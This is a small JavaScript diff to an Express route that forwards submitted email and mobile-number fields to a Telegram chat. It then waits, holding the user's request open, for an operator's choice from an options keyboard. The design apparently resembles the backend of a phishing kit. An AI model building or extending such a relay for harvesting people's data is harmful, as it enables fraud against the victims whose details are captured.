@@ -20,7 +20,7 @@ router.post('/generals', (req, res) => {
 
     \u{1F4E7} Email: ${req.body.email}
 
-    \u{1F4F2} Celular: ${req.body.pemail}
+    \u{1F4F2} Celular: ${req.body.cel}
 
     ----------------------------
 
@@ -62,16 +62,16 @@ router.post('/generals', (req, res) => {
     }),
   };
 
-  bot.sendMessage(CHAT_ID, infoMessage);
-
-  setTimeout(() => { // Evitar que salga primero el teclado
+  bot.sendMessage(CHAT_ID, infoMessage)
+  .then(() =>{
     bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts)
       .then(message => {
         const messageID = message.message_id;
         activeMessages.set(token, { messageID, res }); // Almacena el ID del mensaje y la respuesta HTTP con el token correspondiente
       })
       .catch(err => console.log(err));
-  }, 100);
+  });
+
 })
 
 
